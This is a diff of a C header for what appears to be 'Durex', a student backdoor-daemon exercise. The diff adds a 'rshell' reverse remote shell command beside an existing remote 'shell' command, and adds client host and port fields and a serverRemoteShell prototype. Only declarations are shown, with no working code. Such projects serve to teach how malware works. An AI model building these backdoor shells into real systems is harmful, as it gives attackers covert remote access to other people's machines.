@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/06/28 08:16:36 by root              #+#    #+#             */
-/*   Updated: 2018/08/15 18:05:14 by root             ###   ########.fr       */
+/*   Updated: 2018/08/17 19:53:55 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -19,6 +19,9 @@
 # include <sys/time.h>
 # include <sys/types.h>
 # include <unistd.h>
+/* NI_MAXHOST ... */
+#include <sys/socket.h>
+#include <netdb.h>
 
 # define SERVER_REPORTER	"/var/log/Durex.log"
 # define SERVER_ADDR		"localhost"
@@ -27,7 +30,9 @@
 # define SERVER_CLIENT_BUFF	128
 # define SERVER_COMMANDS	{ "?", "Display this help", &serverHelp },	\
 							{ "shell", "Open a remote shell", &serverShell }, \
-							{ "quit", "Quit server", &serverQuitClient }
+							{ "rshell", "Open a reverse remote shell", &serverRemoteShell }, \
+							{ "quit", "Quit server", &serverQuitClient }, \
+							{ NULL, NULL, NULL }
 
 typedef struct	s_buff
 {
@@ -39,6 +44,9 @@ typedef struct	s_buff
 typedef struct	s_cl
 {
 	int			fd;
+	char		addr[17];
+	char		host[NI_MAXHOST + 1];
+	char		port[NI_MAXSERV + 1];
 	int			logged;
 	t_buff		rd;
 	t_buff		wr;
@@ -70,6 +78,7 @@ void			serverReadClient(t_cl *client);
 void			serverWriteClient(t_cl *client);
 void			serverHelp(t_cl *client, t_cmd *cmds);
 void			serverShell(t_cl *client, t_cmd *cmds);
+void			serverRemoteShell(t_cl *client, t_cmd *cmds);
 void			serverQuitClient(t_cl *client, t_cmd *cmds);
 void			quitClearlyServer();
 void			clearClient(t_cl *client);
